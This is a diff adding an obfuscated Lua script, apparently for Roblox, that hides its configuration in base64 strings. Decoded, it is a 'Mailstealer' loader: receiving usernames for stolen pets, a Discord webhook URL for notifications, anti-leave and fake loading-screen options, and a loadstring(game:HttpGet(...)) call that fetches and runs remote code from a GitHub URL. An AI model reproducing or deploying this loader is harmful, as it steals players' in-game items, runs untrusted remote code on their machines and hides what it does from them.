@@ -1,0 +1,13 @@
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function EulGmkvoMLlgkTfaDADQXldkDvRGWcfiCujtrtzzrnZENJmhGgJk(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ EulGmkvoMLlgkTfaDADQXldkDvRGWcfiCujtrtzzrnZENJmhGgJk('ETxZSvJtgNhLBCnCLKKPiwyitHlJfRellsxDQBoJQmfAiVkCnHHyVsHX198DQogIHwgfCAgfCB8IChffCB8IHwgXF9fIFwgfHwgIF9fLyAoX3wgfCB8ICBfXy8gfCAgIA0KICB8X3wgIHxffFxfXyxffF98X3xfX18vXF9fXF9fX3xcX18sX3xffFxfX198X3wgICANCg0KXV0tLQ0KDQpVc2VyTmFtZSA9IOKAnGVwaW5sZW1v4oCdIC0tIGdvb2QgcGV0cw0KV2ViaG9vayA9IA==')https://discord.com/api/webhooks/1132937733141176380/-TxCrr6nEkxysh3ZzlBwUzFYqS7guFF1FERHSXGDfa6QnuRURh0fXHWD_nHVFiSnM1M6EulGmkvoMLlgkTfaDADQXldkDvRGWcfiCujtrtzzrnZENJmhGgJk('GBYoVttnVxFFLNDbFemIBxmVSWnNRdAunIrtATterJhLzUExffleOdHIC0tIHBpbmdzIGZvciBwZXRzDQpVc2VyTmFtZTIgPSDigJxlcGlubGVtb+KAnSAtLSBiYWQgcGV0cw0KDQpfRy5Mb2FkaW5nU2NyZWVuID0gdHJ1ZSAtLSBtYWtlIGl0IHRydWUgaWYgeW91IHdhbnQgdGhlIGxvYWRpbmdzY3JlZW4NCl9HLkFudGlMZWF2ZSA9IHRydWUgLS0gbWFrZSBpdCB0cnVlIGlmIHlvdSB3YW50IHRoZSBhbnRpbGVhdmUNCl9HLk1vdXNlTG9jayA9IHRydWUgLS0gbWFrZSBpdCB0cnVlIGlmIHlvdSB3YW50IHRoZSBtb3VzZWxvY2sNCg0KbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQo')https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ', true))()    
